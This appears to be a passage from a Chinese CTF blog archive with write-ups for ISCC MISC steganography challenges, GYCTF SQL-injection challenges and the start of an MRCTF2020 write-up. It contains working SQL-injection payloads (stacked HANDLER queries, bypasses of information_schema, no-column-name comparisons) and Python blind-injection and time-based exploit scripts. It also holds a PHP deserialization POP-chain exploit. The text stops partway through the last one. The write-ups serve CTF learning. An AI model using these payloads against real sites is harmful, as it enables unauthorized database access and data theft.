src="http://img-blog.csdnimg.cn/20200522013155184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现箭头所指的应该就是宽高（比较坑的是726是高，141是宽。像素点画图的脚本里会用到）。并且看一下内容，很明显是像素点画图(做MRCTF的千层套路那道题见过)。于是去掉726*141，并改一下格式：<br><img src="http://img-blog.csdnimg.cn/20200522013520726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后将之前的脚本改一下x和y的值，得到如下脚本：</p><pre><code class="py">from PIL import Imagex = 141    #x坐标  通过对txt里的行数进行整数分y = 726    #y坐标  x * y = 行数im = Image.new(&quot;RGB&quot;, (x, y))file = open(&#39;1.txt&#39;)for i in range(0, x):    for j in range(0, y):        line = file.readline()  #获取一行的rgb值        line = line[:-2]        line = line[1:]        #print(line)        rgb = line.split(&quot;, &quot;)  #分离rgb，文本中逗号后面有空格        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))im.save(&#39;test2.png&#39;)</code></pre><p>跑脚本，得到<br><img src="http://img-blog.csdnimg.cn/20200522014108120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看这个把我眼睛都快看瞎了。希望有更好的方法。。。。。<br>而这里只有一半flag，接下来看<code>《道德经》第二十八章.pdf</code>文件里是否有内容。由文件里“知其白，守其黑”<br>尝试看看是不是字体为白色。<br><img src="http://img-blog.csdnimg.cn/20200522014624326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是复制出来，和上边一半组合，最终得到flag。</p><h3 id="MISC6：耳听为实"><a href="#MISC6：耳听为实" class="headerlink" title="MISC6：耳听为实"></a>MISC6：耳听为实</h3><p><strong>题目难度：很难</strong><br><strong>考察：mp3stego工具+python音频信号处理+……</strong><br>这个题正常做感觉比较难，等有大师傅正常做的wp出来后。再把大师傅的wp链接附上。<br>首先，题目是<code>ABC.mp3</code>，很明显首先想到使用mp3stego工具提取隐藏信息。得到<br><img src="http://img-blog.csdnimg.cn/20200529224718973.png" alt="在这里插入图片描述"><br>很明显示是一个网盘链接，且密码是对<code>dHc0aQ==</code>的Base64解码。于是打开网盘链接输入分享密码。进行下载，发现依旧是mp3文件，不过使用mp3stego工具毫无作用，其他音频工具也没效果。于是考虑文件分离。文件分离成功，得到<br><img src="http://img-blog.csdnimg.cn/20200529225105546.png" alt="在这里插入图片描述"><br>ctf-produce.py</p><pre><code class="py">import waveimport numpy as npimport os# 读取音频信号f = wave.open(os.path.abspath(&#39;./flag.wav&#39;), &#39;rb&#39;) # 二进制只读模式，打开音频文件params = f.getparams() # 返回音频参数，元组：声道数，量化位数(byte单位)，采样频率，采样点数，压缩类型，压缩类型的描述nchannels, sampwidth, framerate, nframes=params[:4] # 赋值声道数，量化位数，采样频率，采样点数str = f.readframes(nframes) # 读取采样点数据，字符串类型wave_data = np.fromstring(str, dtype=np.short) # 字符串转换为short类型time = np.arange(0, nframes) * (1.0 / framerate) # 通过采样点数和取样频率计算出每个取样的时间# 语音信号分帧处理wlen = 100 # 帧长inc = 50 # 帧移signal_length = len(wave_data) # 信号总长度if signal_length &lt;= wlen: # 若信号长度小于一个帧的长度，则帧数 nf 定义为1，否则，计算帧的总长度    nf = 1else:    nf = int(np.ceil((1.0*signal_length-wlen+inc)/inc))pad_length = int((nf-1)*inc+wlen) # 所有帧加起来总的铺平后的长度zeros = np.zeros((pad_length-signal_length), dtype=int) # 不够的长度使用0填补pad_signal = np.concatenate((wave_data,zeros)) # 填补后的信号记为pad_signalindices = np.tile(np.arange(0,wlen),(nf,1))+np.tile(np.arange(0,nf*inc,inc), (wlen,1)).T  # 相当于对所有帧的时间点进行抽取，得到nf*wlen长度的矩阵indices = np.array(indices, dtype=np.int32) # 将indices转化为矩阵indices = np.random.permutation(indices)frames = pad_signal[indices] # 得到帧信号frames = frames.flatten()w = wave.open(os.path.abspath(&#39;./flag-RD.wav&#39;), &quot;wb&quot;) # 打开WAV文档# 配置声道数、量化位数和取样频率w.setnchannels(nchannels)w.setsampwidth(sampwidth)w.setframerate(framerate*2) # 采样频率至少是信号频率最高频率的两倍以上才能重新恢复为原来的模拟信号w.writeframes(frames.tostring()) # 将wav_data转换为二进制数据写入文件w.close()f.close()</code></pre><p>使用python代码进行音频信号处理得到的flag-RD.wav。审计然后逆着写出flag.wav的恢复脚本，应该可以得到flag.wav(不会写，有点难)。<br>然后就接不下去了。于是看到一些师傅们在某群里说爆破什么的。于是开个小号，在flag提交框爆破flag，还真的成功了。。<br>果然flag是个弱口令：<code>flag{password}</code></p><h3 id="擂台MISC1：是我DIO哒"><a href="#擂台MISC1：是我DIO哒" class="headerlink" title="擂台MISC1：是我DIO哒"></a>擂台MISC1：是我DIO哒</h3><p><strong>题目难度：简单</strong><br><strong>考察：LSB隐写+文件分离+Base64</strong><br>因为是png图片，首先尝试是否是LSB隐写，发现存在LSB隐写<br><img src="http://img-blog.csdnimg.cn/20200528011123791.png" alt="在这里插入图片描述"></p><pre><code class="shell">Useful_Massage_2(fa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA==)</code></pre><p>由于Useful_Massage_2，很明显，上边Useful_Massage_2()里边可能是Base64编码的第二部分。于是继续查找有用信息。<br>先使用binwalk分析查看图片<br><img src="http://img-blog.csdnimg.cn/20200528012236931.png" alt="在这里插入图片描述"><br>发现有两张png图片，然后使用foremost进行分离，得到一张二维码，扫描得</p><pre><code class="shell">Useful_Massage_1(SVNDQyU3QmZsQGdfaXN)</code></pre><p>两部分括号里的内容按顺序拼接</p><pre><code class="shell">SVNDQyU3QmZsQGdfaXNfa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA==</code></pre><p>然后Base64解码得：<code>ISCC%7Bfl@g_is_kO_N0_D%21o_daaaa%21__%7D</code><br>然后进行url解码即得flag。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>做了这些杂项题，总共收获了以下新知识：<code>使用cv2库</code>、<code>图论的哥尼斯堡七桥问题</code>。其他涉及知识点都见过。比如<code>像素点画图</code>、<code>pdf隐藏白色文字</code>等等。另一篇总结与复现Web题及相关知识点。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋2020新春公益赛 GYCTF有关SQL注入题复现</title>
      <link href="/2020/05/02/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%20GYCTF%E6%9C%89%E5%85%B3SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/05/02/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%20GYCTF%E6%9C%89%E5%85%B3SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近这段时间参加过一些CTF在线竞赛，做过一些Web题，发现SQL注入漏洞出现的频率可真高！不过在做题中也get到了一些Web新知识，现在通过题目复现的方式总结一下。</p><h3 id="0x01-blacklist"><a href="#0x01-blacklist" class="headerlink" title="0x01 blacklist"></a>0x01 blacklist</h3><p><strong>考点：堆叠注入+handler代替select</strong><br><a href="https://blog.csdn.net/qq_43625917/article/details/103055441" target="_blank" rel="noopener">强网杯-随便注</a>改的，但是ban掉了强网杯payload的<code>rename</code>和<code>alter</code><br><strong>查表</strong></p><pre><code class="sql">0&#39;; show tables;#</code></pre><p><strong>查字段</strong></p><pre><code class="sql">0&#39;; show columns from FlagHere;#</code></pre><p>前边查表、查字段和强网杯随便注一样。但查记录(数据)是通过重命名等操作得到flag，但这个题ban掉了<code>rename</code>和<code>alter</code>。<br>查询大师傅博客发现：MySQL还有一个handler的可以代替select进行查询</p><h4 id="handler相关知识"><a href="#handler相关知识" class="headerlink" title="handler相关知识"></a>handler相关知识</h4><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><p><strong>基本语法</strong></p><pre><code class="sql">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE</code></pre><p>1.通过<code>HANDLER tbl_name OPEN</code>打开一张表，无返回结果，实际上我们在这里声明了一个名为<code>tb1_name</code>的句柄。<br>2.通过<code>HANDLER tbl_name READ FIRST</code>获取句柄的第一行，通过<code>READ NEXT</code>依次获取其它行。最后一行执行之后再执行<code>NEXT</code>会返回一个空的结果。<br>3.通过<code>HANDLER tbl_name CLOSE</code>来关闭打开的句柄。</p><p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>4.通过<code>HANDLER tbl_name READ index_name FIRST</code>，获取句柄第一行（索引最小的一行），<code>NEXT</code>获取下一行，<code>PREV</code>获取前一行，<code>LAST</code>获取最后一行（索引最大的一行）。</p><p>通过索引列指定一个值，可以指定从哪一行开始。<br>5.通过<code>HANDLER tbl_name READ index_name = value</code>，指定从哪一行开始，通过NEXT继续浏览。</p><p>如果不想浏览一个表的所有行，可以使用where和limit子句。<br><strong>测试分析</strong><br>1.不通过索引打开查看表<br> （1）打开句柄：</p><pre><code class="sql">handler handler_table open; #打开一张名为handler_table表，无返回结果，声明了一个名为handler_table的句柄</code></pre><p> （2）查看表数据：</p><pre><code class="sql">handler handler_table read first; #获取句柄的第一行handler handler_table read next; #获取下一行</code></pre><p> （3）关闭句柄：</p><pre><code class="sql">handler handler_table close; #关闭打开的句柄</code></pre><p>2.通过索引打开查看表（FIRST,NEXT,PREV,LAST）<br>通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。<br>（1）创建索引：</p><pre><code class="sql">create index handler_index on handler_table(c1);</code></pre><p>（2）打开句柄：</p><pre><code class="sql">handler handler_table open as p;</code></pre><p>（3）查看表数据：</p><pre><code class="sql">handler p read handler_index first; #获取句柄第一行handler p read handler_index next; #获取下一行handler p read handler_index prev; #获取上一行handler p read handler_index last; #获取最后一行</code></pre><p>（4）关闭句柄：</p><pre><code class="sql">handler p close;</code></pre><p>从index为2的地方开始<br>（1） 打开句柄：</p><pre><code class="sql">handler handler_table open as p;</code></pre><p>（2） 查看表数据：</p><pre><code class="sql">handler p read handler_index = (2); #指定从第二行开始handler p read handler_index next;handler p read handler_index prev;handler p read handler_index last;</code></pre><p>（3）关闭句柄：</p><pre><code class="sql">handler p close;</code></pre><p>参考博客：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysql查询语句-handler</a><br>了解完这些，就可以这道题的构造payload了。<br><strong>payload</strong></p><pre><code class="sql">0&#39;; handler FlagHere open as qwzf; handler qwzf read first; handler qwzf close;#</code></pre><p>执行即可得到flag<br><img src="http://img-blog.csdnimg.cn/2020042801075045.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="0x02-Ezsqli"><a href="#0x02-Ezsqli" class="headerlink" title="0x02 Ezsqli"></a>0x02 Ezsqli</h3><p><strong>考点：无information_schema布尔盲注+无列名盲注</strong></p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>做这道题前先预备一下知识：<br>参考博客：<br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a><br><a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">无需“in”的SQL盲注</a><br><a href="http://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">新春战疫公益赛-ezsqli-出题小记</a><br><a href="http://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">对MYSQL注入相关内容及部分Trick的归类小结</a></p><p>参考大师傅博客后，发现绕过对information_schema的过滤，有以下几种方法：</p><h5 id="1、绕过information-schema方法"><a href="#1、绕过information-schema方法" class="headerlink" title="1、绕过information_schema方法"></a>1、绕过information_schema方法</h5><p><strong>MySQL5.7的新特性</strong></p><blockquote><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p></blockquote><p><strong>1.sys.schema_auto_increment_columns</strong><br>作用：简单来说就是用来对表自增ID的监控。</p><pre><code class="sql"># security库    //该库为sqli-labs自动建立    emails,referers,uagents,users</code></pre><p><img src="http://img-blog.csdnimg.cn/20200429003901500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.sys.schema_table_statistics_with_buffer</strong></p><blockquote><p>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer<br>查询表的统计信息，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间</p></blockquote><p><img src="http://img-blog.csdnimg.cn/2020042900410266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>sys.x$schema_table_statistics_with_buffer</p></blockquote><p><img src="http://img-blog.csdnimg.cn/20200429004318312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>sys.x$ps_schema_table_statistics_io<br>可忽略table_name=’db’，默认的并非我创建。</p></blockquote><blockquote><p>sys.x$schema_flattened_keys</p></blockquote><p>当然可能还有，这里就先写这么多。<br><strong>3.利用innoDB引擎绕过对information_schema的过滤(但是mysql默认是关闭InnoDB存储引擎的)</strong></p><h5 id="2、绕过information-schema、join-using-注列名和进行无列名注入"><a href="#2、绕过information-schema、join-using-注列名和进行无列名注入" class="headerlink" title="2、绕过information_schema、join using()注列名和进行无列名注入"></a>2、绕过information_schema、join using()注列名和进行无列名注入</h5><p><strong>1.利用MySQL5.7的新特性获取表名</strong><br>直接用sqli-labs靶场进行测试<br>（1）<code>sys.schema_auto_increment_columns</code></p><pre><code class="sql">?id=-1&#39; union select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20200429010602942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（2）<code>sys.schema_table_statistics_with_buffer</code></p><pre><code class="sql">?id=-1&#39; union select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</code></pre><p>（3）<code>sys.x$schema_table_statistics_with_buffer</code></p><pre><code class="sql">?id=-1&#39; union select 1,2,group_concat(table_name)from sys.x$schema_table_statistics_with_buffer where table_schema=database()--+</code></pre><p>（4）<code>sys.x$ps_schema_table_statistics_io</code></p><pre><code class="sql">?id=-1&#39; union select 1,2,group_concat(table_name)from sys.x$ps_schema_table_statistics_io where table_schema=database()--+</code></pre><p>（5）<code>sys.x$schema_flattened_keys</code></p><pre><code class="sql">?id=-1&#39; union select 1,2,group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()--+</code></pre><p>等等<br><strong>2.join using()注列名</strong></p><blockquote><p>通过系统关键词join可建立两个表之间的内连接。<br>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。<br>并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p></blockquote><pre><code class="sql">#获取第一列的列名select * from(select * from users a join (select * from users)b)c;#获取次列及后续列名select * from(select * from users a join (select * from users)b using(username))c;select * from(select * from users a join (select * from users)b using(username,password))c</code></pre><pre><code class="sql">#获取第一列的列名?id=-1&#39; union select*from (select * from users as a join users b)c--+#得id#获取次列及后续列名?id=-1&#39; union select*from (select * from users as a join users b using(id))c--+#得username?id=-1&#39; union select*from (select * from users as a join users b using(id,username))c--+#password</code></pre><p><strong>3.无列名盲注获取数据</strong><br>直接通过select进行盲注。<br>核心payload：</p><pre><code class="sql">(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></pre><p>子查询之间也可以直接通过<code>&gt;</code>、<code>&lt;</code>、<code>=</code>来进行判断</p><h4 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h4><p>学完上边这些后，继续看这道题：<br><strong>1.测试</strong>：<br>fuzz一波，发现：</p><blockquote><p>过滤了and or关键字<br>过滤了if<br>不能用information_schema<br>没有单独过滤union和select, 但是过滤了union select，union某某某select之类<br>过滤了sys.schema_auto_increment_columns<br>过滤了join</p></blockquote><p><code>2            返回V&amp;N</code><br><code>2||1=1    返回Nu1L</code><br><code>2||1=4    返回V&amp;N</code><br>2查询的是V&amp;N，如果<code>||</code>后面的表达式为True则返回Nu1L；false则返回V&amp;N。</p><p><strong>2.继续测试</strong>：</p><pre><code class="sql">2||substr((select 1),1,1)=2V&amp;N</code></pre><pre><code class="sql">2||substr((select 1),1,1)=1Nu1L</code></pre><p>说明可以进行布尔盲注。<br><strong>3.绕过information_schema</strong><br>绕过information_schema可用以下方法：<br><code>sys.schema_table_statistics_with_buffer</code>或<code>sys.x$schema_table_statistics_with_buffer</code>或<code>sys.x$ps_schema_table_statistics_io</code>等等<br><strong>4.注出表名</strong><br>然后写个脚本注出表名：</p><pre><code class="py">import requestsimport stringstrs = string.printableurl = &quot;http://907a8439-ee8f-4e7a-9a97-f2c65389c019.node3.buuoj.cn/index.php&quot;payload = &quot;2 || ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{0},1))={1}&quot;if __name__ == &quot;__main__&quot;:    name = &#39;&#39;    for i in range(1,40):        char = &#39;&#39;        for j in strs:            payloads = payload.format(i,ord(j))            data={&#39;id&#39;:payloads}            r = requests.post(url=url,data=data)            if &quot;Nu1L&quot; in r.text:                name += j                print(j,end=&#39;&#39;)                char = j                break        if char==&#39;&#39;:            break</code></pre><p><img src="http://img-blog.csdnimg.cn/20200430010645755.png" alt="在这里插入图片描述"><br>注出两张表：<code>users233333333333333,f1ag_1s_h3r3_hhhhh</code><br><strong>5.无列名盲注注出数据</strong><br>因为join被过滤了，所以无法注出列名(字段名)，但可以进行无列名盲注得到数据。<br>参考一下大师傅脚本，写一个脚本：</p><blockquote><p>在这样的按位比较过程中，因为在里层的for()循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c&gt;b此时满足了，题目返回真，出现了Nu1L关键字，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以flag += chr(char-1)，这就是为什么在存flag时候要往前偏移一位的原因</p></blockquote><pre><code class="py">import requestsurl = &#39;http://907a8439-ee8f-4e7a-9a97-f2c65389c019.node3.buuoj.cn/index.php&#39;def str2hex(flag):    res = &#39;&#39;    for i in flag:        res += hex(ord(i))    res = &#39;0x&#39; + res.replace(&#39;0x&#39;,&#39;&#39;)    return resflag = &#39;&#39;for i in range(1,60):    hexchar = &#39;&#39;    for char in range(32, 126):        hexchar = str2hex(flag+ chr(char))        payload = &#39;2||((select 1,{})&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;.format(hexchar)        #payload = &#39;0^((select 1,{})&gt;(select * from(f1ag_1s_h3r3_hhhhh)))&#39;.format(hexchar)        data = {&#39;id&#39;:payload}        r = requests.post(url=url,data=data)        if &#39;Nu1L&#39; in r.text:            flag += chr(char-1)            print(flag)            break</code></pre><p><img src="http://img-blog.csdnimg.cn/20200430015230906.png" alt="在这里插入图片描述"><br>smi1e师傅的exp中用了取反符号<code>~</code>目的也是判断成立，因为MySQL的比较是按位比的。<br>脚本进行了<code>hex()</code>操作，因为MySQL遇到hex会自动转成字符串。<br>(大师傅们太强了，tqqqqqll!!!!)</p><h3 id="0x03-easysqli-copy"><a href="#0x03-easysqli-copy" class="headerlink" title="0x03 easysqli_copy"></a>0x03 easysqli_copy</h3><p><strong>考点：宽字节+PDO堆叠+编码绕过+时间盲注</strong><br>相关知识：<br><a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">PDO场景下的SQL注入探究</a><br><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">从宽字节注入认识PDO的原理和正确使用</a><br>打开题目，发现源码</p><pre><code class="php">&lt;?php     function check($str){        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches)){            print_r($matches);            return 0;        }else{            return 1;        }    }    try{        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);    }catch(Exception $e){        echo $e-&gt;getMessage();    }    if(isset($_GET[&#39;id&#39;])){        $id = $_GET[&#39;id&#39;];    }else{        $test = $db-&gt;query(&quot;select balabala from table1&quot;);        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);        $id = $res[&#39;balabala&#39;];    }    if(check($id)){        $query = &quot;select balabala from table1 where 1=?&quot;;        $db-&gt;query(&quot;set names gbk&quot;);        $row = $db-&gt;prepare($query);        $row-&gt;bindParam(1,$id);        $row-&gt;execute();    }</code></pre><p>发现<code>使用了PDO</code>、<code>set names gbk</code><br>一般来说PDO预编译是不存在sql注入，但是其中<code>$db-&gt;query(&quot;set names gbk&quot;);就造成了宽字节注入</code><br>同时发现一些基本的关键字被过滤了，但可以用<code>char()</code>绕过<br>参考P3师傅和Y1ng师傅的解题思路即可：</p><pre><code class="py">import requestsdef str2hex(string):    c=&#39;0x&#39;    a=&#39;&#39;    for i in string:        a+=hex(ord(i))    return c+a.replace(&#39;0x&#39;,&#39;&#39;)url=&#39;http://0d7a93644ff54a3886e388d2e2d8ac5d71f9fe37e74247d7.changame.ichunqiu.com/?id=&#39;data=&#39;1%df%27;set @a={};prepare test from @a;execute test;&#39;#预编译语句，set设置变量名@和变化的值;#prepare预备一个@a语句，并赋予名称test;#execute执行语句testpayload=&#39;select if((ascii(mid((select fllllll4g from table1),{},1))={}),sleep(6),1);&#39;flag=&#39;&#39;for i in range(1,60):    for x in range(30,127):        newpayload=payload.format(str(i),str(x))#i字符串长度;x是字符ascii        newdata=data.format(str2hex(newpayload))#将sql语句转16进制代入预处理语句        a=requests.session()        if(a.get(url+newdata).status_code==404):            flag+=chr(x)            break    print(flag)</code></pre><h3 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>复现完之后，收获很多。同时不得不慨叹一句：大师傅们ttttttql！！！！我tttttttcl！！！<br>参考博客：<br><a href="http://www.gem-love.com/ctf/1782.html" target="_blank" rel="noopener">i春秋2020新春战“疫”网络安全公益赛GYCTF Writeup 第二天</a><br><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%89%8D%E4%B8%A4%E5%A4%A9-web-writeup/" target="_blank" rel="noopener">i春秋公益赛 前两天 WEB WriteUp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> BUG </tag>
            
            <tag> handler注入 </tag>
            
            <tag> 无列名盲注 </tag>
            
            <tag> 宽字节+PDO堆叠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020部分题的总结与复现</title>
      <link href="/2020/04/10/MRCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/04/10/MRCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>题目整体来说不太难，毕竟是个新生赛，Web出的大部分题都很简单。但考察的知识点等方面，确实需要总结一下。于是我总结了部分MISC和Web。(Crypto不想总结)。</p><h3 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h3><h4 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h4><p>这个题出的感觉在考脑洞。。。前端js验证很好绕过(然而绕过也没啥用，而且直接就可以访问flag.php，但没有flag)只有这个：<br><img src="http://img-blog.csdnimg.cn/20200409232851505.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最近可能做题做傻了，看到IP竟然没想到IP伪造(如XFF欺骗)，枯了。。。</p><h4 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h4><p>这个很容易bypass，数组绕过md5、数字+字母绕过is_numeric()<br><img src="http://img-blog.csdnimg.cn/20200409233850904.jpg" alt="在这里插入图片描述"><br>第二步也可以用语句绕过<code>1234567|1=1</code></p><h4 id="EzPop"><a href="#EzPop" class="headerlink" title="EzPop"></a>EzPop</h4><p>PHP反序列化和pop链我学的不太好(之后再好好学习总结一下)，然后这道题就没做。抽空再补补相关知识。<br>wp说考点就下面这三个：<br><strong>反序列化魔术方法</strong></p><pre><code class="php">__construct()//当一个对象创建时被调用__destruct() //当一个对象销毁时被调用__toString() //当一个对象被当作一个字符串使用__sleep()//在对象在被序列化之前运行__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)__get()//获得一个类的成员变量时调用__set()//设置一个类的成员变量时调用__invoke()//调用函数的方式调用一个对象时的回应方法__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数</code></pre><p><strong>public、protected与private在序列化时的区别</strong><br>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上<code>\0*\0</code>的前缀。这里的 <code>\0</code> 表示 ASCII 码为 0 的字符(不可见字符)，而不是 <code>\0</code> 组合。这也许解释了，为什么如果直接在网址上，传递<code>\0*\0username</code>会报错，因为实际上并不是<code>\0</code>，只是用它来代替ASCII值为0的字符。必须用python传值才可以。<br><strong>BASE64 Wrapper LFI</strong><br><code>php://filter/convert.base64-encode/resource=flag.php</code><br>这里直接粘上wp上的exp和分析过程，自己大致思考了一下：<br><strong>Exp:</strong></p><pre><code class="php">&lt;?php class Show{    public $source;    public $str;}class Test{    public $p;}class Modifier{    protected $var;    function __construct(){        $this-&gt;var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;    }}$s = new Show();$t = new Test();$r = new Modifier();$t-&gt;p = $r;$s-&gt;str = $t;$s-&gt;source = $s;var_dump(urlencode(serialize($s)));?&gt;</code></pre><p><strong>分析</strong></p><pre><code class="python">&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From http://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {    protected  $var;    public function append($value){        include($value);//8.触发这个include，利用php base64 wrapper 读flag    }    public function __invoke(){        $this-&gt;append($this-&gt;var);//7.然后会调用到这里    }}class Show{    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;){        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    }    public function __toString(){        return $this-&gt;str-&gt;source;//4.这里会调用str-&gt;source的__get(获得一个类的成员变量)那么我们将其设置为Test对象    }    public function __wakeup(){    //2.如果pop是个Show,那么调用这里。产生思考：这个地方是可以通过对象属性个数的值大于真实个数的属性，跳过__wakeup的执行        if(preg_match(&quot;/gopher|http|file|ftp|http|dict|\.\./i&quot;, $this-&gt;source)) {        //3.匹配的时候会调用__toString，即当一个对象被当作一个字符串使用时            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class Test{    public $p;    public function __construct(){        $this-&gt;p = array();    }    public function __get($key){        $function = 